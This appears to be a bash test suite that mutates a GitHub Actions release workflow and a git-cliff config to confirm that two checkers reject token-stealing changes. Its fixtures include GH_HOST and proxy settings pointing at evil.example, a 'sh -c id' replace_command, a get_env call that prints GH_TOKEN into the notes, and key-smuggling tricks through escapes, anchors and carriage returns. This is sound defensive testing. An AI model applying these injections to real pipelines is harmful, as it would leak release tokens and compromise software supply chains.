# A directory on $GITHUB_PATH precedes /usr/bin for every later step, so a
# `gh` planted there would run in the release step, holding the token. Even
# the directory git-cliff lands in: the workflow calls it by absolute path.
mutate github-path 's|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
\1echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"|' '>> "$GITHUB_PATH"'
expect_both_reject 'a $GITHUB_PATH write (the old git-cliff entry)' "$mut_dir/github-path.yml" \
  "step 'Install git-cliff (pinned, sha256-verified)' mentions GITHUB_PATH" 'mentions GITHUB_PATH'

# gh only runs in the release step, but a GH_* key anywhere else is where a
# later edit would move it from; both layers keep GH_* to the pinned env.
# The install step's env: the notes step's env is pinned whole (see below).
mutate other-env-gh 's|^\( *\)\(GIT_CLIFF_SHA256: [0-9a-f]*\)$|\1\2\
\1GH_HOST: evil.example|' '          GH_HOST: evil.example'
expect_both_reject "GH_HOST in another step's env" "$mut_dir/other-env-gh.yml" \
  "step 'Install git-cliff (pinned, sha256-verified)' sets ['GH_HOST'] in its env:" \
  "sets a GH_* key outside the release step's env"

mutate with-gh 's|^\( *\)\(fetch-depth: 0\)$|\1\2\
\1GH_HOST: evil.example|' '          GH_HOST: evil.example'
expect_both_reject "GH_HOST in the checkout's with:" "$mut_dir/with-gh.yml" \
  "step 'Checkout' sets ['GH_HOST'] in its with:" \
  "sets a GH_* key outside the release step's env"

# The release step's own env: where the token goes, and to which repository.
mutate step-gh-repo 's|GH_REPO: \${{ github.repository }}|GH_REPO: attacker/fork|' 'GH_REPO: attacker/fork'
expect_both_reject "GH_REPO pointed at another repository" "$mut_dir/step-gh-repo.yml" \
  "'GH_REPO': 'attacker/fork'" "$(head_at 4 '    GH_REPO: attacker/fork')"

mutate step-gh-host 's|^\( *\)\(GH_REPO: \${{ github.repository }}\)$|\1\2\
\1GH_HOST: evil.example|' 'GH_HOST: evil.example'
expect_both_reject "GH_HOST added to the release step's env" "$mut_dir/step-gh-host.yml" \
  "'GH_HOST': 'evil.example'" "$(head_at 5 '    GH_HOST: evil.example')"

# Step keys that change how the pinned block runs, or whether it counts.
for kv in 'shell: bash' 'continue-on-error: true' 'if: false' 'working-directory: /tmp'; do
  k="${kv%%:*}"
  mutate "step-$k" 's|^\( *\)\(- name: Create the release\)$|\1\2\
\1  '"$kv"'|' "  $kv"
  case "$k" in
    continue-on-error) py_keys="['continue-on-error', 'env', 'name', 'run']" ;;
    if) py_keys="['env', 'if', 'name', 'run']" ;;
    *) py_keys="['env', 'name', 'run', '$k']" ;;
  esac
  expect_both_reject "$kv on the release step" "$mut_dir/step-$k.yml" \
    "hold only name, env and run, got $py_keys" "$(head_at 2 "  $kv")"
done

# A pinned GitHub-owned action is still code that can be handed the token and
# never spells gh: the set of actions is pinned, not just their shape.
mutate script-step 's|^\( *\)\(- name: Create the release\)$|\1- name: Script\
\1  uses: actions/github-script@0123456789abcdef0123456789abcdef01234567\
\1\2|' 'actions/github-script@'
expect_both_reject "an extra SHA-pinned actions/github-script step" "$mut_dir/script-step.yml" \
  "got ['actions/checkout', 'actions/github-script']" 'expected exactly one uses: key, found 2'

mutate checkout-tag 's|actions/checkout@[0-9a-f]*|actions/checkout@v7|' 'actions/checkout@v7 '
expect_both_reject "a checkout pinned to a tag, not a SHA" "$mut_dir/checkout-tag.yml" \
  "must be pinned to a 40-hex commit SHA, got 'actions/checkout@v7'" \
  'is not actions/checkout pinned to a 40-hex SHA'

# An explicit key (`? run` / `: |`) is a second run: key the floor's `run:`
# matcher cannot see; PyYAML keeps the last value, so it replaces the block.
{ cat "$wf"; printf '%s\n' '        ? run' '        : |' '          echo replaced'; } > "$mut_dir/explicit-key.yml"
grep -Fq -- '? run' "$mut_dir/explicit-key.yml" || fail "fixture bug: the explicit-key mutation did not apply"
expect_both_reject "an explicit ? run key after the release block" "$mut_dir/explicit-key.yml" \
  'found 0: []' 'is not a single-line plain key: line'

# A whitespace-only line with MORE spaces than the block indentation is
# content to YAML, not a blank line: `|` keeps it, trailing or not.
{ cat "$wf"; printf '%s\n' '            '; } > "$mut_dir/ws-content.yml"
[ "$(tail -n 1 "$mut_dir/ws-content.yml")" = '            ' ] || fail "fixture bug: the ws-content mutation did not apply"
m="$(diff_at 9 '  ') | expected: "
expect_both_reject "a trailing whitespace-only line deeper than the block" "$mut_dir/ws-content.yml" "$m" "$m"

# --- Key spellings the floor cannot read, and the job's own keys ------------
# Every floor rule matches a key by its literal spelling. PyYAML resolves a tag,
# an anchor or an escape to the same key, so each of these is a real `env:` or
# `uses:` to GitHub; the floor's shape rule rejects the spelling itself.
mutate tag-env 's|^\(    timeout-minutes: 15\)$|\1\
    !!str env: {HTTPS_PROXY: http://evil.example:3128}|' '!!str env:'
expect_both_reject "a tagged job-level key (!!str env:)" "$mut_dir/tag-env.yml" \
  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" 'is not a single-line plain key: line'

mutate esc-env 's|^\(    timeout-minutes: 15\)$|\1\
    "e\\x6ev": {HTTPS_PROXY: http://evil.example:3128}|' '"e\x6ev":'
expect_both_reject 'an escaped job-level key ("e\x6ev":)' "$mut_dir/esc-env.yml" \
  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" 'is not a single-line plain key: line'

mutate anchor-uses 's|^\( *\)\(- name: Create the release\)$|\1- name: Script\
\1  \&u uses: actions/github-script@0123456789abcdef0123456789abcdef01234567\
\1\2|' '&u uses:'
expect_both_reject "an anchored step key (&u uses:)" "$mut_dir/anchor-uses.yml" \
  "got ['actions/checkout', 'actions/github-script']" 'is not a single-line plain key: line'

# A value that is an anchor, alias or tag is resolved by PyYAML, never read by
# the floor; the shape rule rejects the value's first character.
mutate anchor-value 's|^\(    timeout-minutes: 15\)$|\1\
    env: \&e {HTTPS_PROXY: http://evil.example:3128}|' 'env: &e {'
expect_both_reject "an anchored job-level value (env: &e {...})" "$mut_dir/anchor-value.yml" \
  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
  'has a value starting with an anchor, alias or tag'

# A job key the Python layer's JOB_KEYS does not list: `container:` runs every
# step, the release step included, inside an image of the workflow's choosing.
mutate job-container 's|^\(    timeout-minutes: 15\)$|\1\
    container: ubuntu:24.04|' 'container: ubuntu'
expect_both_reject "a job-level container:" "$mut_dir/job-container.yml" \
  "got ['container', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
  'is job key container'

# The same at the top level: a workflow-level key reaches the release job.
for kv in 'container: ubuntu:24.04' 'if: false'; do
  k="${kv%%:*}"
  mutate "wf-$k" 's|^jobs:$|'"$kv"'\
jobs:|' "$kv"
  case "$k" in
    container) py_keys="['container', 'jobs', 'name', 'on', 'permissions']" ;;
    *) py_keys="['if', 'jobs', 'name', 'on', 'permissions']" ;;
  esac
  expect_both_reject "a workflow-level $k:" "$mut_dir/wf-$k.yml" \
    "top-level keys must be exactly ['jobs', 'name', 'on', 'permissions'], got $py_keys" \
    "is top-level key $k"
done

# --- git-cliff by its absolute path ---------------------------------------------
# A bare name resolves through the PATH, the very thing no step may extend.
mutate cliff-bare 's|"\$RUNNER_TEMP/bin/git-cliff" --config cliff.toml --tag "\$TAG" --latest|git-cliff --config cliff.toml --tag "$TAG" --latest|' \
  'git-cliff --config cliff.toml --tag "$TAG" --latest'
expect_both_reject "a bare git-cliff call" "$mut_dir/cliff-bare.yml" \
  'git-cliff is called by a bare name' 'calls git-cliff by a bare name'

mutate cliff-path 's|"\$RUNNER_TEMP/bin/git-cliff" --config cliff.toml --tag "\$TAG" --latest|"$RUNNER_TEMP/git-cliff" --config cliff.toml --tag "$TAG" --latest|' \
  '"$RUNNER_TEMP/git-cliff" --config'
expect_both_reject "a git-cliff call by another path" "$mut_dir/cliff-path.yml" \
  'expected exactly 2 git-cliff calls by absolute path' 'expected exactly 2 git-cliff calls by absolute path'

# --- GITHUB_ENV outside run: ---------------------------------------------------
# A step's `shell:` template is a command line too; Python reads every string
# in the step, the floor every line that is not a YAML comment.
mutate shell-env 's|^\( *\)\(- name: Generate the release notes\)$|\1\2\
\1  shell: "bash -e {0}; echo GH_HOST=evil.example >> $GITHUB_ENV"|' 'shell: "bash -e {0}; echo'
expect_both_reject 'a shell: template writing $GITHUB_ENV' "$mut_dir/shell-env.yml" \
  "step 'Generate the release notes' mentions GITHUB_ENV" 'mentions GITHUB_ENV'

# --- Negative controls: what the context rules must NOT reject -----------------
mutate comment-env 's|^\( *\)\(# shell\.\)$|\1\2\
\1# Nothing here writes GITHUB_ENV or GITHUB_PATH.|' '# Nothing here writes GITHUB_ENV'
expect_both_accept "a YAML comment naming GITHUB_ENV and GITHUB_PATH" "$mut_dir/comment-env.yml"

mutate mygh 's|^\( *\)\(GIT_CLIFF_SHA256: [0-9a-f]*\)$|\1\2\
\1MYGH_TOKEN: unrelated|' 'MYGH_TOKEN: unrelated'
expect_both_accept "an env key that merely contains GH_ (MYGH_TOKEN)" "$mut_dir/mygh.yml"

# --- The floor reports every problem, not the first ---------------------------
mutate multi 's|^\(    timeout-minutes: 15\)$|\1\
    defaults: {run: {shell: bash}}|
s|^\( *\)\(cat "\$RUNNER_TEMP/notes.md"\)$|\1\2\
\1echo X=1 >> "$GITHUB_ENV"|' 'X=1 >> "$GITHUB_ENV"'
if out="$(release_run_check "$mut_dir/multi.yml")"; then
  fail "release_run_check must reject defaults: plus a \$GITHUB_ENV write, but it accepted it"
fi
grep -Fq -- 'sets defaults:' <<<"$out" \
  || fail "release_run_check did not report the defaults: line among several problems: $out"
grep -Fq -- 'mentions GITHUB_ENV' <<<"$out" \
  || fail "release_run_check did not report the GITHUB_ENV line among several problems: $out"
ok "the floor reports both of two problems (defaults: and a \$GITHUB_ENV write)"

# --- cliff.toml shell hooks ------------------------------------------------------
cliff_fixture() {
  local label="$1" file="$2" msg="$3" out
  if out="$(cliff_shell_check "$file")"; then fail "cliff_shell_check must reject $label, but it accepted it"; fi
  grep -Fq -- "$msg" <<<"$out" || fail "cliff_shell_check rejected $label for an unrelated reason (wanted: $msg): $out"
  ok "cliff.toml check rejects $label"
}
sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [\
  { pattern = ".*", replace_command = "sh -c id" },\
]|' "$cliff" > "$mut_dir/cliff-cmd.toml"
grep -Fq -- 'replace_command' "$mut_dir/cliff-cmd.toml" || fail "fixture bug: the cliff-cmd mutation did not apply"
cliff_fixture "a replace_command" "$mut_dir/cliff-cmd.toml" 'uses replace_command'

sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = "a", replace = "b" }]|' "$cliff" > "$mut_dir/cliff-proc.toml"
grep -Fq -- 'replace = "b"' "$mut_dir/cliff-proc.toml" || fail "fixture bug: the cliff-proc mutation did not apply"
cliff_fixture "a non-empty commit_preprocessors" "$mut_dir/cliff-proc.toml" 'non-empty *processors list'

# --- Bytes, repeats, the notes step, cliff.toml escapes ---------------------
# The floor is stricter than PyYAML on a few VALID layouts it cannot read line
# by line. Each such fixture asserts that the floor rejects it with its own
# message and that PyYAML accepts it - the strictness is deliberate and
# measured, not an accident.
expect_floor_only_reject() {
  local label="$1" mut_file="$2" sh_msg="$3" out
  if out="$(release_run_check "$mut_file")"; then
    fail "release_run_check (the floor) must reject $label, but it accepted it"
  fi
  grep -Fq -- "$sh_msg" <<<"$out" \
    || fail "release_run_check rejected $label for an unrelated reason (wanted: $sh_msg): $out"
  if [ "$have_yaml" -eq 1 ]; then
    out="$(python3 -I "$check_py" "$mut_file" 2>&1)" \
      || fail "release_workflow_check.py was expected to accept $label (the floor alone is stricter), but it rejected it: $out"
  fi
  ok "the floor alone rejects $label"
}

# A bare CR is a line break to YAML but not to awk: this hides a job-level
# env inside what the floor would otherwise read as the timeout-minutes line.
cr="$(printf '\r')"
mutate cr-env "s|^\\(    timeout-minutes: 15\\)\$|\\1${cr}    env:${cr}      HTTPS_PROXY: http://evil.example:3128|" 'HTTPS_PROXY'
expect_both_reject "a bare CR hiding a job-level env" "$mut_dir/cr-env.yml" \
  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
  'holds a byte outside printable ASCII'

# Repeats: PyYAML keeps the LAST of a duplicate key, silently.
{ cat "$wf"; printf '%s\n' 'permissions:' '  contents: write'; } > "$mut_dir/dup-top.yml"
grep -Fq -- 'contents: write' "$mut_dir/dup-top.yml" || fail "fixture bug: the dup-top mutation did not apply"
expect_both_reject "a repeated top-level permissions:" "$mut_dir/dup-top.yml" \
  'top-level permissions must be contents: read' 'repeats top-level key permissions'

mutate dup-job-key 's|^\(    timeout-minutes: 15\)$|\1\
    runs-on: ubuntu-24.04|' 'runs-on: ubuntu-24.04'
expect_both_reject "a repeated job key (runs-on)" "$mut_dir/dup-job-key.yml" \
  "must run on ubuntu-latest, got 'ubuntu-24.04'" 'repeats job key runs-on'

{ cat "$wf"; printf '%s\n' '  other:' '    runs-on: ubuntu-latest'; } > "$mut_dir/second-job.yml"
grep -Fq -- '  other:' "$mut_dir/second-job.yml" || fail "fixture bug: the second-job mutation did not apply"
expect_both_reject "a second job" "$mut_dir/second-job.yml" \
  'must define exactly one job' 'is a second job'

# The steps list written at the job's key column (`    - name:` under
# `    steps:`) is valid YAML with the same meaning; the floor, which tells a
# job key from a step by its column, refuses it.
sed '/^    steps:$/,$ s/^      /    /' "$wf" > "$mut_dir/seq-jobcol.yml"
grep -q '^    - name: Checkout$' "$mut_dir/seq-jobcol.yml" || fail "fixture bug: the seq-jobcol mutation did not apply"
expect_floor_only_reject "the steps list at the job's key column" "$mut_dir/seq-jobcol.yml" \
  "is a sequence entry at the job's key column"

# The `jobs:` line goes through every rule, like any other line: a trailing
# comment naming gh is not a YAML comment LINE, so the gh rule rejects it.
mutate jobs-gh 's/^jobs:$/jobs: # gh/' 'jobs: # gh'
expect_floor_only_reject "jobs: # gh" "$mut_dir/jobs-gh.yml" 'mentions gh outside any run: block'

# A lone `---` before the first key only opens the one document.
mutate doc-start 's/^name: Release$/---\
name: Release/' '---'
expect_both_accept "a --- document marker before the first key" "$mut_dir/doc-start.yml"

# The notes step's env is exactly TAG: a GIT_CLIFF_* variable reconfigures
# git-cliff (GIT_CLIFF_CONFIG names another config file; a GIT_CLIFF__* one
# overrides any setting, and is also banned outright, below), so the
# cliff.toml checks would guard a file git-cliff no longer obeys.
mutate notes-env 's|^\( *\)\(# shell\.\)$|\1\2\
\1GIT_CLIFF_CONFIG: /tmp/evil.toml|' 'GIT_CLIFF_CONFIG: /tmp/evil'
expect_both_reject "a GIT_CLIFF_CONFIG in the notes step's env" "$mut_dir/notes-env.yml" \
  "the notes step's env must be exactly TAG, got" \
  "$(printf '%s' 'the notes step differs from the pinned step at line 3: got:     GIT_CLIFF_CONFIG: /tmp/evil.toml')"

# git-cliff from two steps, still two calls: the env pin above holds for one
# step only, so every call must come from that one.
mutate cliff-2steps 's|"\$RUNNER_TEMP/bin/git-cliff" --config cliff.toml --tag "\$TAG" --latest|echo --latest|
s|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
\1"$RUNNER_TEMP/bin/git-cliff" --version|' 'git-cliff" --version'
expect_both_reject "git-cliff called from two steps" "$mut_dir/cliff-2steps.yml" \
  'expected git-cliff to run from exactly one step, found 2' 'calls git-cliff from a second step'

# cliff.toml: a trailing comment is not a list entry, an escaped key is
# refused, and a real postprocessors key is held to the same empty list.
sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = []  # note|' "$cliff" > "$mut_dir/cliff-comment.toml"
grep -Fq -- '[]  # note' "$mut_dir/cliff-comment.toml" || fail "fixture bug: the cliff-comment mutation did not apply"
out="$(cliff_shell_check "$mut_dir/cliff-comment.toml")" \
  || fail "cliff_shell_check must accept a trailing comment after an empty list, but it rejected it: $out"
ok "cliff.toml check accepts commit_preprocessors = []  # note"

sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = ".*", "replace_\\u0063ommand" = "sh -c id" }]|' "$cliff" > "$mut_dir/cliff-esc.toml"
grep -Fq -- 'replace_\u0063ommand' "$mut_dir/cliff-esc.toml" || fail "fixture bug: the cliff-esc mutation did not apply"
cliff_fixture 'an escaped key ("replace_\u0063ommand")' "$mut_dir/cliff-esc.toml" 'escape - an escaped key can spell'

sed 's|^\[changelog\]$|[changelog]\
postprocessors = [{ pattern = "a", replace = "b" }]|' "$cliff" > "$mut_dir/cliff-post.toml"
grep -Fq -- 'postprocessors = [{' "$mut_dir/cliff-post.toml" || fail "fixture bug: the cliff-post mutation did not apply"
cliff_fixture "a non-empty postprocessors under [changelog]" "$mut_dir/cliff-post.toml" 'non-empty *processors list'

# --- Overrides from inside run:, cliff.toml's env and escapes, one document ----
# The notes step's env is pinned, but its own run: text could still export a
# GIT_CLIFF__* override just before calling git-cliff.
mutate export-gc 's|^\( *\)\(if \[ -n "\$prev" \]; then\)$|\1export GIT_CLIFF__GIT__FILTER_UNCONVENTIONAL=false\
\1\2|' 'export GIT_CLIFF__'
expect_both_reject 'an export GIT_CLIFF__* inside the notes run:' "$mut_dir/export-gc.yml" \
  "step 'Generate the release notes' mentions GIT_CLIFF__" 'mentions GIT_CLIFF__'

# Accept controls for the notes step: its name's value is free, and a line
# that mentions the absolute path without starting with it is not a call.
mutate notes-rename 's/^\( *\)- name: Generate the release notes$/\1- name: Render the notes/' 'Render the notes'
expect_both_accept "a renamed notes step" "$mut_dir/notes-rename.yml"
mutate cliff-mention 's|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
\1test -x "$RUNNER_TEMP/bin/git-cliff" \|\| exit 1|' 'test -x "$RUNNER_TEMP/bin/git-cliff" ||'
expect_both_accept "a git-cliff path mention that is not a call, in another step" "$mut_dir/cliff-mention.yml"

# One `---` before the first key opens the document; a second opens another,
# which PyYAML's safe_load refuses.
mutate doc-twice 's/^name: Release$/---\
---\
name: Release/' '---'
expect_both_reject "two --- markers before the first key" "$mut_dir/doc-twice.yml" \
  'expected a single document in the stream' 'is not a single-line plain key: line'

# Tera's get_env() prints the runner's env into the published notes.
sed 's|^\[changelog\]$|[changelog]\
footer = "{{ get_env(name=\\"GH_TOKEN\\") }}"|' "$cliff" > "$mut_dir/cliff-getenv.toml"
grep -Fq -- 'get_env(name=' "$mut_dir/cliff-getenv.toml" || fail "fixture bug: the cliff-getenv mutation did not apply"
cliff_fixture "a get_env() call" "$mut_dir/cliff-getenv.toml" 'calls get_env'

# TOML 1.1's \xHH escape spells a key as well as \u does.
sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = ".*", "replace_\\x63ommand" = "sh -c id" }]|' "$cliff" > "$mut_dir/cliff-escx.toml"
grep -Fq -- 'replace_\x63ommand' "$mut_dir/cliff-escx.toml" || fail "fixture bug: the cliff-escx mutation did not apply"
cliff_fixture 'an escaped key ("replace_\x63ommand")' "$mut_dir/cliff-escx.toml" 'escape - an escaped key can spell'

# A quoted `#` must not hide a real replace_command, whatever the comment
# strip does: this one also sits in a *processors list.
sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = "a#b", replace_command = "sh -c id" }]|' "$cliff" > "$mut_dir/cliff-hash.toml"
grep -Fq -- '"a#b", replace_command' "$mut_dir/cliff-hash.toml" || fail "fixture bug: the cliff-hash mutation did not apply"
cliff_fixture 'a replace_command after a quoted "#"' "$mut_dir/cliff-hash.toml" 'uses replace_command'

# A quoted `#` must not cut the line before a real replace_command. This one
# sits in a plain inline table, outside any *processors list, so only the
# replace_command grep can reject it: cliff-hash above also trips the
# non-empty *processors check, which would hide a broken replace_command grep.
sed 's|^\[changelog\]$|[changelog]\
x = { a = "a#b", replace_command = "sh -c id" }|' "$cliff" > "$mut_dir/cliff-hash-bare.toml"
grep -Fq -- 'x = { a = "a#b", replace_command' "$mut_dir/cliff-hash-bare.toml" || fail "fixture bug: the cliff-hash-bare mutation did not apply"
grep -q 'processors' <<<"$(grep -F 'replace_command' "$mut_dir/cliff-hash-bare.toml")" \
  && fail "fixture bug: cliff-hash-bare must keep its replace_command off every *processors line"
cliff_fixture 'a replace_command after a quoted "#", outside any *processors list' "$mut_dir/cliff-hash-bare.toml" 'uses replace_command'

# Inside a TOML multi-line string ("""/'''), a line that looks like a comment
# is template text that Tera renders into the public notes. A Markdown heading
# has exactly that shape, so the replace_command, get_env and escape greps
# read the raw file: each of these would pass a comment-stripped read.
sed 's|^\[changelog\]$|[changelog]\
footer = """\
# {{ get_env(name="HOME") }}\
"""|' "$cliff" > "$mut_dir/cliff-heading-getenv.toml"
grep -Fxq -- '# {{ get_env(name="HOME") }}' "$mut_dir/cliff-heading-getenv.toml" || fail "fixture bug: the cliff-heading-getenv mutation did not apply"
cliff_fixture 'a get_env() on a "#"-led line of a """ string' "$mut_dir/cliff-heading-getenv.toml" 'calls get_env'

sed 's|^\[changelog\]$|[changelog]\
footer = """\
text # {{ get_env(name=n) }}\
"""|' "$cliff" > "$mut_dir/cliff-trail-getenv.toml"
grep -Fxq -- 'text # {{ get_env(name=n) }}' "$mut_dir/cliff-trail-getenv.toml" || fail "fixture bug: the cliff-trail-getenv mutation did not apply"
cliff_fixture 'a get_env() after a " #" inside a """ string' "$mut_dir/cliff-trail-getenv.toml" 'calls get_env'

sed 's|^\[changelog\]$|[changelog]\
header = """\
# replace_command = "sh -c id"\
"""|' "$cliff" > "$mut_dir/cliff-heading-cmd.toml"
grep -Fxq -- '# replace_command = "sh -c id"' "$mut_dir/cliff-heading-cmd.toml" || fail "fixture bug: the cliff-heading-cmd mutation did not apply"
cliff_fixture 'a replace_command on a "#"-led line of a """ string' "$mut_dir/cliff-heading-cmd.toml" 'uses replace_command'

# The raw read fails closed: an escape inside a real comment is rejected too,
# because this check cannot tell a comment from a "#"-led line of a """
# string. The real cliff.toml has no \u, \U or \x anywhere, comments included.
{ cat "$cliff"; printf '%s\n' '# a \u0041 in a whole-line comment'; } > "$mut_dir/cliff-esc-comment.toml"
grep -Fxq -- '# a \u0041 in a whole-line comment' "$mut_dir/cliff-esc-comment.toml" || fail "fixture bug: the cliff-esc-comment mutation did not apply"
cliff_fixture 'a \u escape in a whole-line comment (fails closed)' "$mut_dir/cliff-esc-comment.toml" 'escape - an escaped key can spell'

sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = []  # and \\u0041 after a value|' "$cliff" > "$mut_dir/cliff-esc-trail.toml"
grep -Fq -- '[]  # and \u0041 after' "$mut_dir/cliff-esc-trail.toml" || fail "fixture bug: the cliff-esc-trail mutation did not apply"
cliff_fixture 'a \u escape in a trailing comment (fails closed)' "$mut_dir/cliff-esc-trail.toml" 'escape - an escaped key can spell'

mutate unrelated 's/whole history up to/all of history up to/' 'all of history up to'
expect_both_accept "an unrelated change in another step" "$mut_dir/unrelated.yml"

# --- R1: a column-0 comment standing in for a real, removed flag -------------
# PyYAML dedents a `run: |` block, so a comment written at the same indentation
# as its sibling commands lands at column 0 in check.py; its comment strip must
# still remove it, or `# sha256sum --check` stands in for a `--check` removed
# from the real line. The floor reads the raw text through $commands, which
# drops the comment line wholesale, so its ordinary sha256sum check rejects it.
mutate col0 's/sha256sum --check --strict -/sha256sum --strict -\
          # sha256sum --check/' '# sha256sum --check'
if [ "$have_yaml" -eq 1 ]; then
  if out="$(python3 -I "$check_py" "$mut_dir/col0.yml" 2>&1)"; then
    fail "release_workflow_check.py must reject a column-0 decoy comment standing in for --check, but it exited 0"
  fi
  grep -Fq -- 'no sha256 verification in any run: step' <<<"$out" \
    || fail "release_workflow_check.py rejected the column-0 comment fixture for an unrelated reason: $out"
fi
if grep -Eq 'sha256sum[[:space:]]+--check' <<<"$(grep -vE '^[[:space:]]*#' "$mut_dir/col0.yml")"; then
  fail "the shell floor's own sha256sum check must also reject this fixture, but it accepted it"
fi
ok "a real --check standing only in a column-0 comment is rejected (sha256sum check)"

echo "PASS: release_workflow_test ($pass assertions)"
